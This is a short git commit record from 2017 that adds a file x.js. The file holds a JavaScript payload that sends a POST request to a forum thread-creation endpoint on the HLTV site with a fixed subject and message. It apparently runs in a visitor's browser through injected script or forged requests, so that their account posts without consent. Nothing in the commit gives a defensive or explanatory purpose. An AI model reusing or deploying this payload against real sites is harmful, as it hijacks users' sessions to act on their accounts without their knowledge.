285580f92fca881466e01b501a0688a2990d839b
jardeet <jardeetoassi@jmail.ovh>
2017-07-05 22:36:12 +0200

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,7 @@
+var url = "https://www.hltv.org/forums/create-xxxthread";
+var params = "forum=1&subject=HLTV.pro&topic=BATISTUTA%20pls%20fix";
 
+var http = new XMLHttpRequest();
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http.send(params);
